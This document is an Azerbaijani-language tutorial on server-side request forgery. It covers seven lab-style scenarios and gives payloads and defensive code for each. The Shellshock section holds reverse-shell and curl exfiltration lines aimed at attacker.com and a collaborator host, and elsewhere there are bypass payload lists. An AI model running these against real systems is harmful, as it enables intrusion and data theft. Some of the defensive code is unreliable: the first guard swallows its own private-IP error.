# 🔐 Server-Side Request Forgery (SSRF) — Tam Ekspert Bələdçisi

> **Səviyyə:** APPRENTICE → PRACTITIONER → EXPERT  
> **Kateqoriya:** Web Security / Server-Side Vulnerabilities  
> **OWASP:** A10:2021 – Server-Side Request Forgery  

---

## 📋 Mündəricat

| # | Mövzu | Səviyyə |
|---|-------|---------|
| 1 | [Basic SSRF against the local server](#1-basic-ssrf-against-the-local-server) | 🟢 APPRENTICE |
| 2 | [Basic SSRF against another back-end system](#2-basic-ssrf-against-another-back-end-system) | 🟢 APPRENTICE |
| 3 | [Blind SSRF with out-of-band detection](#3-blind-ssrf-with-out-of-band-detection) | 🟡 PRACTITIONER |
| 4 | [SSRF with blacklist-based input filter](#4-ssrf-with-blacklist-based-input-filter) | 🟡 PRACTITIONER |
| 5 | [SSRF with filter bypass via open redirection](#5-ssrf-with-filter-bypass-via-open-redirection-vulnerability) | 🟡 PRACTITIONER |
| 6 | [Blind SSRF with Shellshock exploitation](#6-blind-ssrf-with-shellshock-exploitation) | 🔴 EXPERT |
| 7 | [SSRF with whitelist-based input filter](#7-ssrf-with-whitelist-based-input-filter) | 🔴 EXPERT |

---

## Ümumi Giriş: SSRF Nədir?

**Server-Side Request Forgery (SSRF)** — hücumçunun server tərəfindəki proqramı istənilməyən yerə HTTP sorğuları göndərməyə məcbur etdiyi bir zəiflik növüdür.

```
Normal axın:
  Browser ──► Web Server ──► Legitimate API

SSRF axını:
  Browser ──► Web Server ──► Internal Network / localhost / Cloud Metadata
                  ▲
              Hücumçu URL-i idarə edir
```

### SSRF-in Əsas Təhlükələri

- **Internal xidmətlərə giriş** — firewall arxasındakı sistemlər
- **Cloud metadata oğurluğu** — AWS/GCP/Azure credential-ları
- **Port scanning** — daxili şəbəkə kəşfiyyatı
- **Remote Code Execution** — Shellshock kimi exploit-lərlə birlikdə
- **Authentication bypass** — localhost-dan gələn sorğulara xüsusi etibar

---

## 1. Basic SSRF against the local server

> 🟢 **APPRENTICE** | Klassik başlanğıc nöqtəsi

### Konsept və Mexanizm

Ən sadə SSRF formasıdır. Tətbiq URL parametri qəbul edib həmin URL-ə server tərəfindən sorğu göndərir. Hücumçu bu URL-i `http://localhost/` və ya `http://127.0.0.1/` kimi dəyişdirir.

**Niyə localhost xüsusidir?**  
Web server öz localhost-una qoşulduqda, bu sorğu adətən daha yüksək icazə səviyyəsi ilə işlənir. İnkişafçılar tez-tez "local = güvənilir" fərziyyəsi edirlər.

```
Hücumçu ──► POST /product/stock ──► Server
                                       │
                          stockApi=http://localhost/admin
                                       │
                                       ▼
                              localhost:80/admin
                              (Firewall yoxdur, auth yoxdur)
```

### Zəiflik Nümunəsi

```http
POST /product/stock HTTP/1.1
Host: vulnerable-site.com
Content-Type: application/x-www-form-urlencoded

stockApi=http://www.stock-service.internal/product/123
```

**Normal parametr dəyişdirildikdə:**

```http
stockApi=http://localhost/admin
```

### Hücum Addımları

**Addım 1:** URL parametri olan funksiyaları tap (stock checker, webhook, URL preview, PDF generator)

**Addım 2:** Parametri localhost-a yönləndir:
```
http://localhost/
http://127.0.0.1/
http://0.0.0.0/
http://[::1]/          ← IPv6 localhost
http://127.1/          ← Qısaldılmış forma
```

**Addım 3:** Admin paneli, gizli endpoint-lər tap:
```
http://localhost/admin
http://localhost/admin/delete?username=carlos
http://127.0.0.1:8080/internal-api
```

### Burp Suite ilə Praktik Test

```
1. Intercept açıq iken stock/price check et
2. Request-i "Repeater"ə göndər
3. stockApi parametrini dəyiş:
   stockApi=http://localhost/admin
4. Response-u analiz et — admin panel HTML-i görünsə, SSRF mövcuddur
5. Fəaliyyət üçün:
   stockApi=http://localhost/admin/delete?username=carlos
```

### Server Cavab Siqnalları

| Response | Məna |
|----------|------|
| 200 + HTML content | SSRF uğurlu, internal resurs əldə edildi |
| 401 / 403 | Endpoint mövcuddur, amma auth lazımdır |
| 404 | Endpoint yoxdur, başqa path sına |
| Connection timeout | Host əlçatmazdır |
| Same error as original | URL parametri server tərəfindən işlənmir |

### Ətraflı Payload Siyahısı

```
# Localhost variasiyaları
http://localhost/
http://127.0.0.1/
http://0.0.0.0/
http://[::1]/
http://2130706433/        ← 127.0.0.1-in decimal forması
http://0177.0.0.1/        ← Octal forma
http://0x7f000001/        ← Hex forma

# Common admin paths
http://localhost/admin
http://localhost/admin/users
http://localhost/management
http://localhost:8080/actuator
http://localhost:8080/actuator/env
http://localhost:9000/metrics
```

### Müdafiə

```python
# Pis (zəif) yanaşma
def fetch_url(url):
    return requests.get(url)  # Birbaşa istifadəçi inputu

# Düzgün yanaşma
import ipaddress
from urllib.parse import urlparse

ALLOWED_DOMAINS = ['api.trusted-service.com']

def safe_fetch(url):
    parsed = urlparse(url)
    
    if parsed.scheme not in ('http', 'https'):
        raise ValueError("Invalid scheme")
    
    if parsed.hostname not in ALLOWED_DOMAINS:
        raise ValueError("Domain not allowed")
    
    try:
        ip = ipaddress.ip_address(parsed.hostname)
        if ip.is_private or ip.is_loopback:
            raise ValueError("Private IP not allowed")
    except ValueError:
        pass
    
    return requests.get(url, timeout=5)
```

---

## 2. Basic SSRF against another back-end system

> 🟢 **APPRENTICE** | Daxili şəbəkə kəşfiyyatı

### Konsept və Mexanizm

Bu ssenaridə hədəf localhost deyil, daxili şəbəkədəki **başqa bir server**dir. Microservice arxitekturalarında ümumi haldır — bir web server, firewall-ın arxasında olan admin serverlərə, database interfeyslərə, ya da monitoring sistemlərə daxil olmaq üçün istifadə edilir.

```
Internet
    │
    ▼
[Web Server: 192.168.0.1]
    │
    │ (Internal Network: 192.168.0.0/24)
    ├──► [Admin Server: 192.168.0.68:8080]   ← Hədəf
    ├──► [Database: 192.168.0.15:5432]
    └──► [Cache: 192.168.0.22:6379]
```

### Daxili Şəbəkə Skanlaması

Hücumçu hansı IP-lərin aktiv olduğunu bilmir. Buna görə **Burp Intruder** ilə brute-force edir:

```http
POST /product/stock HTTP/1.1

stockApi=http://192.168.0.§1§:8080/admin
```

**Intruder konfiqurasiyası:**
```
Attack type: Sniper
Payload type: Numbers
Range: 1 to 254
Step: 1
```

**Nəticəni analiz etmə:**
- `200 OK` → Admin panel tapıldı
- `404 Not Found` → Host var, ama path yoxdur
- `Connection refused` → Port bağlıdır
- `Timeout` → Host yoxdur

### Tam Hücum Ssenarisi

```
Mərhələ 1 — Subnet kəşfi:
stockApi=http://192.168.0.1/
stockApi=http://10.0.0.1/
stockApi=http://172.16.0.1/

Mərhələ 2 — Host skanlaması (Intruder):
stockApi=http://192.168.0.§1-254§:8080/

Mərhələ 3 — Port skanlaması (tapılan host üzərindən):
stockApi=http://192.168.0.68:§1-65535§/

Mərhələ 4 — Path enumeration:
stockApi=http://192.168.0.68:8080/admin
stockApi=http://192.168.0.68:8080/admin/users
stockApi=http://192.168.0.68:8080/api/v1/
```

### Port Skanlaması Texnikası

**Response zamanına görə:**
```
Açıq port    → Tez cavab (200, 404, 403)
Bağlı port   → "Connection refused" — yenə də tez
Filtered     → Timeout — ləng cavab
```

### Əsas Hədəf Portlar

```
80, 443       — HTTP/HTTPS
8080, 8443    — Alt web serverləri  
22            — SSH
3306          — MySQL
5432          — PostgreSQL
6379          — Redis (auth olmadan oxumaq mümkün ola bilər)
27017         — MongoDB
9200          — Elasticsearch (admin API)
2375          — Docker daemon (kritik!)
10250         — Kubernetes kubelet API
```

### Redis SSRF Exploitation

Redis auth olmadan çalışırsa, SSRF ilə birbaşa komanda göndərmək mümkündür:

```
stockApi=dict://192.168.0.22:6379/info
stockApi=gopher://192.168.0.22:6379/_SET%20key%20value
```

### Müdafiə

```python
# Python: Private IP bloklaması
import socket
import ipaddress
from urllib.parse import urlparse

def is_safe_url(url):
    hostname = urlparse(url).hostname
    
    try:
        ip_str = socket.gethostbyname(hostname)
        ip = ipaddress.ip_address(ip_str)
    except:
        return False
    
    if any([
        ip.is_private,
        ip.is_loopback,
        ip.is_link_local,
        ip.is_reserved,
        ip.is_multicast
    ]):
        return False
    
    return True
```

---

## 3. Blind SSRF with out-of-band detection

> 🟡 **PRACTITIONER** | Görünməz hücumların aşkarlanması

### Konsept: Blind SSRF Nədir?

Klassik SSRF-dən fərqli olaraq, **Blind SSRF**-də server daxili sorğunu yerinə yetirir, lakin nəticəni cavabda göstərmir. Hücumçu birbaşa "gördüm, işlədi" deyə bilmir.

```
Klassik SSRF:
Hücumçu ──► Server ──► Internal URL ──► Response içərisində nəticə görünür

Blind SSRF:
Hücumçu ──► Server ──► Internal URL ──► Nəticə gizlidir
               │
               └──► DNS/HTTP sorğu ──► Attacker's OOB Server
                                        (Burada izləyirik!)
```

### Out-of-Band (OOB) Texnikası

OOB dedikdə, sübut əldə etmək üçün **xarici bir server** (DNS, HTTP) istifadə etmək nəzərdə tutulur. Ən populyar alət: **Burp Collaborator**.

```
Necə işləyir:
1. Burp Collaborator unikal subdomain verir:
   abc123xyz.burpcollaborator.net

2. Hücumçu bu URL-i SSRF payload-ına daxil edir:
   Referer: http://abc123xyz.burpcollaborator.net

3. Zəif server bu URL-ə DNS/HTTP sorğu edir

4. Collaborator panelində sorğu görünür → SSRF təsdiqləndi!
```

### Praktik Nümunə

**Zəif istək:**
```http
GET /product?productId=1 HTTP/1.1
Host: vulnerable-site.com
Referer: https://normal-site.com/
```

**SSRF testi:**
```http
GET /product?productId=1 HTTP/1.1
Host: vulnerable-site.com
Referer: http://YOUR-COLLABORATOR-ID.burpcollaborator.net
```

### Burp Collaborator İstifadəsi

```
1. Burp Suite Pro → "Collaborator" tabı
2. "Copy to clipboard" → Unikal URL al
   Misal: https://abcdef123.oastify.com

3. Bu URL-i test etmək istədiyin header/parametrə daxil et:
   - Referer header
   - X-Forwarded-For
   - stockApi parametri
   - webhook_url / callback_url

4. Sorğu gön, Collaborator-u izlə
5. DNS/HTTP sorğu gəlsə → Blind SSRF mövcuddur
```

### Ən Effektiv Yerlər

```http
# HTTP Header-lar
Referer: http://collaborator.net/
X-Forwarded-For: http://collaborator.net/
X-Real-IP: collaborator.net
Host: collaborator.net

# Form parametrları
webhook=http://collaborator.net/
callback=http://collaborator.net/
avatar_url=http://collaborator.net/image.png
pdf_url=http://collaborator.net/doc.pdf

# JSON body
{"url": "http://collaborator.net/"}
{"image": {"src": "http://collaborator.net/"}}
```

### Interactsh (Open Source Alternative)

```bash
# Burp Pro yoxdursa, interactsh istifadə et
go install -v github.com/projectdiscovery/interactsh/cmd/interactsh-client@latest

interactsh-client
# Çıxış: Your subdomain: abcdefgh.oast.fun
```

### DNS Exfiltration Texnikası

```
# Məlumatı DNS sorğusuna kodlamaq
stockApi=http://internal-host.YOUR-COLLABORATOR.net/

# Collaborator-da görəcəksin:
DNS lookup: internal-host.YOUR-COLLABORATOR.net
# → "internal-host" adlı server mövcuddur!
```

### Müdafiə

```bash
# Egress filtering — iptables ilə
# Yalnız müəyyən xarici hostlara çıxışa icazə ver
iptables -A OUTPUT -d api.stripe.com -j ACCEPT
iptables -A OUTPUT -d api.sendgrid.com -j ACCEPT

# Bütün digər xarici sorğuları blok et
iptables -A OUTPUT -j DROP
```

```python
# Python: DNS rebinding qoruması
import time
import socket

def safe_resolve(hostname):
    ip1 = socket.gethostbyname(hostname)
    time.sleep(0.1)
    ip2 = socket.gethostbyname(hostname)
    
    if ip1 != ip2:
        raise SecurityError("DNS rebinding detected!")
    
    return ip1
```

---

## 4. SSRF with blacklist-based input filter

> 🟡 **PRACTITIONER** | Zəif müdafiəni keçmək

### Konsept: Blacklist Filtrləri

Bir çox developer SSRF-i bloklamaq üçün sadə blacklist istifadə edir. Bu filtrlər müəyyən string-ləri (məs: "localhost", "127.0.0.1") rədd edir. Lakin bu yanaşma **çox zəifdir** — eyni mənanı ifadə edən onlarca alternativ mövcuddur.

```
Blacklist yoxlayır:    "localhost", "127.0.0.1"
Hücumçu istifadə edir: "127.1", "2130706433", "0x7f000001"
```

### Bypass Texnikaları Kataloqu

#### 1. IP Alternativ Formaları

```
# Decimal (nöqtəsiz)
http://2130706433/          ← 127.0.0.1 = 2130706433

# Octal
http://0177.0.0.1/          ← 0177 = 127 (octal)

# Hex
http://0x7f000001/          ← 0x7f = 127
http://0x7f.0x0.0x0.0x1/

# IPv6
http://[::1]/
http://[0:0:0:0:0:0:0:1]/
http://[::ffff:127.0.0.1]/

# Qısaldılmış
http://127.1/
http://127.0.1/
```

#### 2. DNS Alternativ Hostnamelər

```
# Loopback hostname-ləri
http://localtest.me/        ← 127.0.0.1-ə resolve olur (real domain)
http://127.0.0.1.nip.io/   ← nip.io xidməti

# URL encoding
http://%6c%6f%63%61%6c%68%6f%73%74/   ← "localhost" URL-encoded
http://127%2e0%2e0%2e1/               ← Nöqtələr encoded

# Qarışıq case
http://LOCALHOST/
http://LocalHost/
http://lOcAlHoSt/
```

#### 3. URL Strukturu ilə Bypass

```
# Credentials əlavə etmək
http://evil.com@127.0.0.1/
http://127.0.0.1#evil.com

# Double URL encoding
http://%2F%2F127.0.0.1%2F
```

#### 4. Unicode Homograph Hücumu

```
# Unicode rəqəmləri — görünüşcə eyni, amma fərqli character
http://①②⑦.⓪.⓪.①/        ← Unicode circled digits
```

### Praktik Bypass Ssenarisi

```http
# Test 1 — Birbaşa (bloklanır)
stockApi=http://localhost/admin
→ "External stock check URL appears to be blocked"

# Test 2 — Decimal IP (keçir?)
stockApi=http://2130706433/admin

# Test 3 — Hex (keçir?)
stockApi=http://0x7f000001/admin

# Test 4 — nip.io (keçir?)
stockApi=http://127.0.0.1.nip.io/admin
```

### Path Traversal ilə Kombinasiya

```
# "admin" sözü bloklanırsa:
stockApi=http://127.0.0.1/ADMIN          ← uppercase
stockApi=http://127.0.0.1/%61dmin        ← URL encode
stockApi=http://127.0.0.1/adm%00in      ← null byte
stockApi=http://127.0.0.1/./admin/./    ← dot traversal
```

### Müdafiə — Blacklist Problemi

```python
# Blacklist yanaşması (ZƏİF):
BLOCKED = ['localhost', '127.0.0.1', '0.0.0.0']

def check_url(url):
    for blocked in BLOCKED:
        if blocked in url:  # Bypass edilə bilər!
            return False
    return True

# Düzgün yanaşma — DNS resolve sonrası IP yoxlaması:
import socket
import ipaddress
from urllib.parse import urlparse

def is_safe_url(url):
    try:
        parsed = urlparse(url)
        hostname = parsed.hostname
        
        # DNS-i resolve et — actual IP-ni al
        ip_str = socket.gethostbyname(hostname)
        ip = ipaddress.ip_address(ip_str)
        
        # IP-nin özünü yoxla, string-i deyil
        if ip.is_private or ip.is_loopback or ip.is_reserved:
            return False
            
        return True
    except Exception:
        return False
```

---

## 5. SSRF with filter bypass via open redirection vulnerability

> 🟡 **PRACTITIONER** | Zəncirli zəifliklər

### Konsept: İki Zəifliyin Kombinasiyası

Bu ssenaridə SSRF filtrini birbaşa keçmək mümkün deyil. Lakin eyni tətbiqdə bir **Open Redirect** zəifliyi mövcuddur. Bu iki zəifliyi birləşdirərək filtr keçilir.

```
Ssenariya:

1. SSRF filter: yalnız "https://stock.weliketoshop.net" domeninə icazə verir
2. Open redirect: /next?path=URL → istənilən URL-ə redirect edir

Hücum zənciri:
stockApi=https://stock.weliketoshop.net/product/nextProduct?path=http://192.168.0.68/admin

Axın:
Server → stock.weliketoshop.net/...?path=http://192.168.0.68/admin
       ↓ (302 Redirect)
Server → http://192.168.0.68/admin  ← SSRF uğurludur!
```

### Open Redirect Nədir?

```
Normal:  /redirect?url=https://trusted-partner.com/page
Zəif:    /redirect?url=https://evil.com

HTTP/1.1 302 Found
Location: https://evil.com   ← Hər hansı URL-ə yönləndirir
```

### Hücum Addımları

**Addım 1:** Open redirect tap

```
# Tətbiqdə navigasiya parametrləri axtar:
/next?path=
/redirect?url=
/goto?target=
/forward?to=
?returnUrl=
?redirectTo=
?nextPage=
?callback=
```

**Addım 2:** Open redirect-i test et:

```http
GET /product/nextProduct?currentProductId=6&path=http://evil.com HTTP/1.1
Host: stock.weliketoshop.net

→ HTTP/1.1 302 Found
   Location: http://evil.com   ← Open redirect mövcuddur!
```

**Addım 3:** SSRF filtrinə allowlist olan domeni istifadə et:

```http
POST /product/stock HTTP/1.1

stockApi=http://stock.weliketoshop.net/product/nextProduct?currentProductId=6&path=http://192.168.0.68/admin
```

**Nə baş verir:**
```
1. Filter: "stock.weliketoshop.net" — icazəli ✓
2. Server bu URL-ə qoşulur
3. Server 302 redirect alır: Location: http://192.168.0.68/admin
4. Server redirect-i izləyir
5. Daxili admin paneli fetch edilir ✓
```

### Daha Mürəkkəb Zəncirlər

```
# Metadata API üçün:
stockApi=https://allowed.com/redirect?url=http://169.254.169.254/latest/meta-data/

# Şifrəli protokollar:
stockApi=https://allowed.com/redirect?url=file:///etc/passwd
```

### Redirect Növləri

```http
# 301 Permanent Redirect — SSRF-i izlər
HTTP/1.1 301 Moved Permanently
Location: http://internal-host/

# 302 Found — SSRF-i izlər
HTTP/1.1 302 Found
Location: http://internal-host/

# 307 Temporary Redirect — Method saxlanılır (POST → POST)
HTTP/1.1 307 Temporary Redirect
Location: http://internal-host/

# Meta redirect — Server bunu izləməyə bilər
<meta http-equiv="refresh" content="0;url=http://internal-host/">
```

### Müdafiə

```python
def fetch_without_redirect_to_internal(url):
    """Redirectləri əl ilə idarə et"""
    
    session = requests.Session()
    
    # Auto-redirect-i söndür
    response = session.get(url, allow_redirects=False)
    
    if response.status_code in (301, 302, 303, 307, 308):
        redirect_url = response.headers.get('Location')
        
        # Redirect URL-i də yoxla
        if not is_safe_url(redirect_url):
            raise SecurityError(f"Redirect to unsafe URL: {redirect_url}")
        
        return session.get(redirect_url)
    
    return response
```

---

## 6. Blind SSRF with Shellshock exploitation

> 🔴 **EXPERT** | Remote Code Execution

### Konsept: İki Kritik Zəifliyin Birləşməsi

Bu ən dağıdıcı SSRF ssenarisidir. İki ayrı zəifliyin kombinasiyası:

1. **Blind SSRF** — server daxili hostlara sorğu edir
2. **Shellshock (CVE-2014-6271)** — Bash-in kritik zəifliyi, xüsusi HTTP header-larla RCE icra edir

```
Hücum zənciri:
Browser ──► SSRF payload ──► Internal Host (Shellshock-a həssas)
                                      │
                    HTTP Header: () { :; }; /bin/bash -c 'CMD'
                                      │
                               RCE icra olunur!
                                      │
                    Nəticə ──► OOB Server (DNS/HTTP)
```

### Shellshock (CVE-2014-6271) Nədir?

2014-cü ildə aşkar edilmiş kritik Bash zəifliyi. Bash, mühit dəyişkənlərini işlədərkən `() { :; };` funksiya tərifindən sonra gələn əmrləri icra edir.

```bash
# Zəif Bash nümunəsi
env 'VAR=() { :; }; echo VULNERABLE' bash -c "echo test"
# Əgər "VULNERABLE" çıxarsa → Shellshock mövcuddur!
```

**CGI Script kontekstində:**
```
Web server HTTP header-ları mühit dəyişkənlərinə çevirir.
CGI script bu dəyişkənləri bash ilə işlədərsə:

User-Agent: () { :; }; /bin/bash -c 'id'
            ↓
BASH işlədilir:
() { :; };                ← Dummy funksiya
/bin/bash -c 'id'         ← Bu icra olunur!
```

### Tam Hücum Ssenarisi

```
Taktika:
1. SSRF ilə daxili hostları scan et (192.168.0.0/24)
2. CGI script-i olan hostları tap (/cgi-bin/)
3. Shellshock payload-ını User-Agent header-ına yerləşdir
4. Komanda nəticəsini Burp Collaborator-a OOB ilə göndər
```

**Addım 1: SSRF ilə internal scan**
```http
POST /product/stock HTTP/1.1
Referer: http://192.168.0.§1§:8080/

[Intruder: 1-254]
→ Hansı IP-lərin aktiv olduğunu tap
```

**Addım 2: Shellshock payloadı**
```http
POST /product/stock HTTP/1.1
User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/COLLABORATOR.net/80 0>&1
Referer: http://192.168.0.X:8080/cgi-bin/stats
```

**Addım 3: OOB exfiltration**
```bash
# User-Agent vasitəsilə komanda çıxışını göndər:
User-Agent: () { :; }; /bin/bash -c 'curl http://COLLABORATOR.net/$(whoami)'

# DNS vasitəsilə:
User-Agent: () { :; }; /bin/bash -c 'nslookup $(whoami).COLLABORATOR.net'

# Faylları oxu:
User-Agent: () { :; }; /bin/bash -c 'curl -d @/etc/passwd http://COLLABORATOR.net/'
```

### CGI Script Enumeration

```
CGI skriptlər adətən bu path-larda olur:
/cgi-bin/status
/cgi-bin/stats  
/cgi-bin/test
/cgi-bin/printenv   ← Debug məqsədi ilə, çox təhlükəli!
/cgi-bin/env
/cgi-bin/admin

Intruder ilə scan:
http://192.168.0.X:8080/cgi-bin/§wordlist§
```

### Shellshock Variant-ları

```bash
# Klassik
() { :; }; command

# Alternative
() { ignored; }; command  

# Reverse shell
() { :; }; /bin/bash -i >& /dev/tcp/attacker.com/4444 0>&1

# Python reverse shell
() { :; }; python -c 'import socket,subprocess,os;
s=socket.socket();s.connect(("attacker.com",4444));
os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);
subprocess.call(["/bin/sh","-i"]);'
```

### Kollaborator Nəticəsinin Analizi

```
Collaborator-da görmək gözlənilən:
──────────────────────────────────────────
DNS: www.COLLABORATOR.net
HTTP GET: /root (whoami = root!)
HTTP POST: /etc/passwd məzmunu
──────────────────────────────────────────
→ RCE təsdiqləndi, server root ilə işləyir!
```

### Müdafiə

```bash
# 1. Bash-i yeniləyin (ən vacib)
apt-get update && apt-get install --only-upgrade bash

# 2. CGI skriptlərini söndür (lazım deyilsə)
# Apache:
a2dismod cgi
service apache2 restart

# 3. Bash əvəzinə dash istifadə edin
usermod -s /bin/dash www-data
```

```python
# Python: Təhlükəli header pattern-lərini filtrlə
import re

DANGEROUS_PATTERNS = [
    r'\(\s*\)\s*\{',  # Shellshock pattern: () {
    r'<script',
    r'javascript:',
]

def sanitize_headers(headers):
    safe_headers = {}
    for key, value in headers.items():
        for pattern in DANGEROUS_PATTERNS:
            if re.search(pattern, value, re.IGNORECASE):
                raise SecurityError(f"Dangerous content in header: {key}")
        safe_headers[key] = value
    return safe_headers
```

---

## 7. SSRF with whitelist-based input filter

> 🔴 **EXPERT** | Ən güclü filtri keçmək

### Konsept: Whitelist Filtrləri

Blacklist-dən fərqli olaraq, whitelist yalnız icazə verilmiş domen/IP-ləri qəbul edir. Bu çox daha güclü müdafiədir — amma hələ də bypass edilə bilər.

```
Whitelist filter:
✅ stock.weliketoshop.net
❌ Hər şey başqa

Bypass sualı: URL-i necə düzəldim ki, 
              həm whitelist keçsin, 
              həm də daxili host-a qoşulsun?
```

### URL Parsing Qeyri-müəyyənliyi

Müxtəlif dillər/kitabxanalar URL-ləri fərqli parse edir:

```
URL: http://user@host/path
         ^^^^  ^^^^
         user  host

http://expected-host@evil-host/
         ^^^^^^^^^^^^^  ^^^^^^^^^
         "username"     actual host

Bəzi parserlər "evil-host"-u host kimi görür
Bəzi filtrlər "expected-host"-u host kimi görür
```

### Whitelist Bypass Texnikaları

#### Texnika 1: @ Simvolu (Credentials)

```
http://expected.com@internal-host/

URL strukturu:
  scheme://[userinfo@]host[:port]/path

Filter görür:    expected.com (domain kimi)
Server qoşulur: internal-host (real host)
```

**Praktik nümunə:**
```
Whitelist: stock.weliketoshop.net

Payload:
http://stock.weliketoshop.net@192.168.0.68/admin

Python urlparse:
  netloc: stock.weliketoshop.net@192.168.0.68
  hostname: 192.168.0.68  ← Real host!

Filter yoxlaması: "stock.weliketoshop.net" var? ✓
Qoşulan yer: 192.168.0.68 → SSRF!
```

#### Texnika 2: # Fragment Identifier

```
http://internal-host#.stock.weliketoshop.net
         ^^^^^^^^^^^^^  ^^^^^^^^^^^^^^^^^^^
         Actual host     Fragment (gözardı edilir)

http://192.168.0.68#stock.weliketoshop.net/admin
```

#### Texnika 3: Double URL Encoding

```
Normal: http://localhost/admin
Encoded: http://localhost%2fadmin

Double encoded:
http://localhost%252fadmin
         ↓ server decode edir ↓
http://localhost%2fadmin
         ↓ server decode edir ↓  
http://localhost/admin

Filter: path-da "admin" görmür → keçir!
```

#### Texnika 4: Credentials + Fragment Kombinasiyası

```
http://localhost%2523@stock.weliketoshop.net/admin
                 ^^^^
                 %23 = # (double encoded)

Decode ediləndə:
http://localhost#@stock.weliketoshop.net/admin
```

### Tam Whitelist Bypass Addımları

```
Whitelist: yalnız "stock.weliketoshop.net"

Addım 1 — @ bypass cəhdi:
stockApi=http://stock.weliketoshop.net@192.168.0.68/admin

Addım 2 — # bypass cəhdi:
stockApi=http://192.168.0.68#stock.weliketoshop.net/admin

Addım 3 — Double encoding:
stockApi=http://stock.weliketoshop.net%252F@192.168.0.68/admin

Addım 4 — Credential + fragment kombinasiyası:
stockApi=http://localhost%2523@stock.weliketoshop.net/admin
```

### URL Parsing Fərqliliklərinin İstismarı

```python
# Fərqli parserlər, fərqli nəticələr:
from urllib.parse import urlparse

url = "http://evil.com@stock.weliketoshop.net/"

result = urlparse(url)
print(result.hostname)  # stock.weliketoshop.net
print(result.netloc)    # evil.com@stock.weliketoshop.net

# Hər dil fərqli davranır!
# Bu fərqlilikdən istifadə edərək filter bypass edilir.
```

### SSRF üçün URL Fuzzing Framework

```python
def generate_bypass_payloads(whitelist_host, target):
    payloads = [
        # @ bypass
        f"http://{whitelist_host}@{target}/",
        f"http://{whitelist_host}%40{target}/",
        
        # # bypass  
        f"http://{target}#{whitelist_host}",
        f"http://{target}%23{whitelist_host}",
        
        # Double encoding
        f"http://{whitelist_host}%252F@{target}/",
        
        # Subdomain
        f"http://{target}.{whitelist_host}/",
        f"http://{whitelist_host}.{target}/",
        
        # Port bypass
        f"http://{target}:80@{whitelist_host}/",
    ]
    return payloads

# İstifadə:
payloads = generate_bypass_payloads(
    "stock.weliketoshop.net", 
    "192.168.0.68"
)
for p in payloads:
    print(p)
```

### Müdafiə — Güclü Whitelist

```python
import socket
import ipaddress
import time
from urllib.parse import urlparse, unquote

class SSRFProtection:
    
    ALLOWED_HOSTS = {
        'stock.weliketoshop.net',
        'api.weliketoshop.net'
    }
    
    ALLOWED_SCHEMES = {'https'}
    
    def validate_url(self, url: str) -> bool:
        # 1. URL decode et (double encoding-i aşkarla)
        decoded = unquote(unquote(url))
        if decoded != url:
            url = decoded
        
        # 2. Parse et
        try:
            parsed = urlparse(url)
        except Exception:
            return False
        
        # 3. Scheme yoxla
        if parsed.scheme not in self.ALLOWED_SCHEMES:
            return False
        
        # 4. Credentials yoxla (@ bypass)
        if '@' in parsed.netloc:
            return False
        
        # 5. Fragment yoxla (# bypass)
        if parsed.fragment:
            return False
        
        # 6. Hostname whitelist
        if parsed.hostname not in self.ALLOWED_HOSTS:
            return False
        
        # 7. DNS resolve et
        try:
            ip_str = socket.gethostbyname(parsed.hostname)
            ip = ipaddress.ip_address(ip_str)
            
            if ip.is_private or ip.is_loopback:
                return False
                
        except socket.gaierror:
            return False
        
        # 8. İkinci DNS resolve (DNS rebinding yoxlaması)
        time.sleep(0.1)
        try:
            ip_str2 = socket.gethostbyname(parsed.hostname)
            if ip_str != ip_str2:
                return False  # DNS rebinding!
        except:
            return False
        
        return True
```

---

## 📊 Müqayisəli Cədvəl

| Mövzu | Səviyyə | Filter Tipi | Əsas Texnika | Risk |
|-------|---------|-------------|--------------|------|
| Local server SSRF | 🟢 | Yoxdur | Birbaşa localhost | Yüksək |
| Back-end SSRF | 🟢 | Yoxdur | IP scan | Yüksək |
| Blind OOB | 🟡 | Yoxdur | DNS/HTTP OOB | Orta |
| Blacklist bypass | 🟡 | Blacklist | IP encoding | Yüksək |
| Open redirect bypass | 🟡 | Whitelist | Redirect zənciri | Yüksək |
| Shellshock SSRF | 🔴 | Yoxdur | RCE via headers | Kritik |
| Whitelist bypass | 🔴 | Whitelist | URL parsing | Kritik |

---

## 🛡️ Ümumi Müdafiə Strategiyası

### Defense in Depth

```
Layer 1: Input validation — URL parse + whitelist
Layer 2: DNS resolution check — private IP blok
Layer 3: Network-level — egress filtering, iptables
Layer 4: Runtime — timeout, redirect limit
Layer 5: Monitoring — anomaly detection, logging
```

### Production-Ready Müdafiə Kodu

```python
import socket
import ipaddress
import time
import requests
from urllib.parse import urlparse, unquote
from typing import Optional
import logging

logger = logging.getLogger(__name__)

class ProductionSSRFGuard:
    """Enterprise-grade SSRF qoruması"""
    
    def __init__(
        self,
        allowed_hosts: set = None,
        allowed_schemes: set = None,
        timeout: int = 5,
        max_redirects: int = 3
    ):
        self.allowed_hosts = allowed_hosts or set()
        self.allowed_schemes = allowed_schemes or {'https'}
        self.timeout = timeout
        self.max_redirects = max_redirects
        
        self.private_ranges = [
            ipaddress.ip_network('10.0.0.0/8'),
            ipaddress.ip_network('172.16.0.0/12'),
            ipaddress.ip_network('192.168.0.0/16'),
            ipaddress.ip_network('127.0.0.0/8'),
            ipaddress.ip_network('169.254.0.0/16'),
            ipaddress.ip_network('::1/128'),
            ipaddress.ip_network('fc00::/7'),
        ]
    
    def _is_private_ip(self, ip_str: str) -> bool:
        try:
            ip = ipaddress.ip_address(ip_str)
            return any(ip in network for network in self.private_ranges)
        except ValueError:
            return True
    
    def _resolve_and_check(self, hostname: str) -> Optional[str]:
        try:
            ip = socket.gethostbyname(hostname)
            
            if self._is_private_ip(ip):
                logger.warning(f"SSRF blocked: {hostname} → {ip} (private)")
                return None
            
            # DNS rebinding yoxlaması
            time.sleep(0.05)
            ip2 = socket.gethostbyname(hostname)
            
            if ip != ip2:
                logger.warning(f"DNS rebinding: {hostname}: {ip} → {ip2}")
                return None
            
            return ip
        except socket.gaierror:
            return None
    
    def validate(self, url: str) -> bool:
        url = unquote(unquote(url))
        
        try:
            parsed = urlparse(url)
        except Exception:
            return False
        
        if parsed.scheme not in self.allowed_schemes:
            return False
        
        if '@' in (parsed.netloc or ''):
            return False
        
        if self.allowed_hosts and parsed.hostname not in self.allowed_hosts:
            return False
        
        if not self._resolve_and_check(parsed.hostname):
            return False
        
        return True
    
    def safe_get(self, url: str) -> requests.Response:
        if not self.validate(url):
            raise ValueError(f"SSRF blocked: {url}")
        
        session = requests.Session()
